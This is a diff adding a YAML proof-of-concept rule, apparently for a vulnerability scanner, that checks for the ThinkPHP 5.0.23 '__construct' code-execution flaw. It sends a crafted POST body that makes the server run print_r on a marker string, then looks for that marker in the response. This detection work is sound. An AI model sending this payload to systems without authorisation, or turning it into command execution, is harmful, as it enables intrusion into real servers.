@@ -1,0 +1,16 @@
+name: poc-yaml-thinkphp-construct-code-exec
+rules:
+  - method: POST
+    path: /index.php?s=captcha
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101
+        Firefox/71.0
+    body: >-
+      _method=__construct&filter%5B%5D=print_r&method=get&server%5BREQUEST_METHOD%5D=56540676a129760a3
+    follow_redirects: false
+    expression: |
+      response.status==200 && response.body.bcontains(b"56540676a129760a3") 
+detail:
+  author: megapyroblast
+  Affected Version: "ThinkPHP 5.0.23"
